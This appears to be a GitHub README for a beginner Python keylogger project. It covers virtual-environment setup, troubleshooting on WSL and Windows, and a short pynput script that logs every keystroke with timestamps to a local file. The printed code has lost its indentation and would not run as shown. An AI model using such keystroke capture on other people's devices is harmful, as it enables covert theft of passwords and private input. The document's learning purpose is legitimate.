# Keylogger_Project

Project Description

This project is a Python-based keylogger designed to capture keystrokes and store them in a local text file. It was created for learning and exploration purposes, and it demonstrates the use of libraries and logging functionality in Python.

Learning Objectives

The goals for this project included:
   
    Building a functional keylogger script in Python.
    Understanding and resolving issues with virtual environments and package installations.
    Gaining familiarity with troubleshooting techniques in different development environments (WSL and native Windows).

Prerequisites:

    Python 3.10 or later
    pynput package
    Virtual environment setup (optional)

Setup and Installation
  1. Clone the repository:

    git clone https://github.com/yourusername/Keylogger_Project.git

  2. Create a virtual environment:

    python3 -m venv keylogger_env

  3. Activate the environment:

  For Windows:

      keylogger_env\Scripts\activate

  For WSL/Linux:

      source keylogger_env/bin/activate

  4. Install dependencies:

    pip install pynput

Usage

  1. Run the script:

    python3 keylogger_script.py

  2. Log files will be generated in the same directory as <keylogger_script.py>.


Key Challenges and Solutions

During this project, several challenges were encountered and resolved:

    1. Issue: ModuleNotFoundError for pynput
        -Solution: Verified virtual environment installation and activated it correctly. Found that sudo bypassed the virtual environment, so permissions were managed without sudo.

    2. Environment-Specific Issues:
        -Problem: Script did not initially work on WSL.
        -Solution: Troubleshot environment by switching to a native Windows environment. This helped verify if WSL-specific permissions were the source of the issue.

    3. Permissions:
        -Solution: Adjusted file permissions in Ubuntu to ensure the script could write to the log file, especially when running without elevated permissions.

Script Overview

Each part of the code in keylogger_script.py is briefly explained below to help other users understand its function:

python

    from pynput import keyboard
    import logging
    from datetime import datetime

    # Setup logging configuration
    logging.basicConfig(filename="key_log.txt", level=logging.DEBUG, format="%(asctime)s - %(message)s")

    # Function to log keystrokes
    def on_press(key):
    logging.info(f"{key} pressed")

    # Start listener
    with keyboard.Listener(on_press=on_press) as listener:
    listener.join()

  - pynput: Used to capture keystrokes.
  - logging: Logs each keystroke into key_log.txt with date and timestamp.
  - keyboard.Listener: Initiates listening and logging until manually stopped.

Future Improvements

  - Error Handling: Add error handling for different environments.
  - Dynamic File Paths: Allow for customizable log file paths.
